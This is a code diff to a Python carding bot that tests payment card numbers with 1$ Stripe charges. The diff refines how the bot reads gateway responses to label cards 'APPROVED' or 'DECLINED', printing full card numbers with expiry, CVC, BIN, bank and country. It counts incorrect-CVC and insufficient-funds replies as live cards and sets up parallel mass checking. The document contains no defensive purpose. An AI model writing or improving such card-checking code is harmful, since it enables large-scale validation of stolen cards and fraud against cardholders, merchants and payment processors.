@@ -746,32 +746,90 @@ def test_charge(cc_line):
         
         # Check for success (CHARGED 1$ should only show when actually charged)
         ajax_response_lower = ajax_response_text.lower()
+        final_message_lower = final_message.lower()
         
+        # CRITICAL: Check if final_message itself contains "CHARGED 1$" or "CHARGED"
+        # This is the highest priority check - if response says charged, it's charged!
+        if "charged 1$" in final_message_lower or "charged" in final_message_lower:
+            # Make sure it's not a false positive by checking it's not in error context
+            if "not charged" not in final_message_lower and "could not charge" not in final_message_lower:
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 1$ 🔥 - Payment Successful!
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        
+        # CRITICAL: Only consider success if HTTP status is 200
+        # Non-200 status codes mean the request failed
+        if ajax_status != 200:
+            # If status is not 200, it's definitely not a successful charge
+            # Check for APPROVED responses (CVC incorrect or insufficient funds) from error message
+            if "Your card's security code is incorrect." in final_message or "security code is incorrect" in final_message.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
+            if "Your card has insufficient funds." in final_message or "insufficient funds" in final_message.lower():
+                return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
+            # Non-200 status and no approval indicators = declined
+            return f"""
+❌ DECLINED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message if final_message else 'Card declined'}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        
+        # Only check for success if status is 200
         # Only show "CHARGED 1$" when we have actual successful charge
         is_success = False
-        success_indicators = [
-            '"success":true',
-            'payment successful',
-            'thank you for your payment',
-            'transaction successful',
-            'payment approved',
-            'charge successful',
-            'your payment has been processed',
-            'payment completed',
-            'payment accepted',
-            'thank you! your gift',
-            'payment was successful',
-        ]
-
-        for indicator in success_indicators:
-            if indicator in ajax_response_lower:
-                is_success = True
-                break
-
-        # Also check JSON structure
+        
+        # FIRST: Check JSON structure (most reliable)
         try:
             ajax_json = json.loads(ajax_response_text)
             if isinstance(ajax_json, dict):
+                # Check for explicit success flags
                 if ajax_json.get('success') == True:
                     is_success = True
                 elif ajax_json.get('status') == 'success':
@@ -781,6 +839,7 @@ def test_charge(cc_line):
                 elif ajax_json.get('payment_status') == 'succeeded':
                     is_success = True
                     
+                # Check nested data object
                 if ajax_json.get('data'):
                     data = ajax_json['data']
                     if isinstance(data, dict):
@@ -788,15 +847,36 @@ def test_charge(cc_line):
                             is_success = True
                         elif data.get('status') == 'success':
                             is_success = True
-        except:
-            pass
-
-        # SAFETY CHECK: If decline indicators present, it's NOT charged
-        if is_success:
-            decline_indicators = ['declined', 'error', 'failed', 'invalid']
-            for indicator in decline_indicators:
-                if indicator in ajax_response_lower:
+                        # If data has error, it's definitely not success
+                        if 'error' in data or data.get('success') == False:
+                            is_success = False
+                
+                # CRITICAL: If JSON has explicit error or success=false, it's NOT charged
+                if 'error' in ajax_json or ajax_json.get('success') == False:
                     is_success = False
+        except:
+            # If not JSON, check text indicators
+            pass
+        
+        # SECOND: If JSON check didn't find success, check text indicators (but be more strict)
+        if not is_success:
+            success_indicators = [
+                '"success":true',
+                '"success": true',
+                'charged 1$',
+                'charged',
+                'payment successful',
+                'thank you for your payment',
+                'transaction successful',
+                'charge successful',
+                'your payment has been processed',
+                'payment completed',
+                'thank you! your gift',
+            ]
+
+            for indicator in success_indicators:
+                if indicator in ajax_response_lower:
+                    is_success = True
                     break
 
         if is_success:
@@ -886,7 +966,7 @@ def check_single_cc(cc_line):
     return test_charge(cc_line)
 
 # Mass CC check function for /mst command with parallel processing
-def check_mass_cc(cc_lines, max_workers=20):
+def check_mass_cc(cc_lines, max_workers=10):
     """Process multiple CCs in parallel with threading"""
     results = []
     
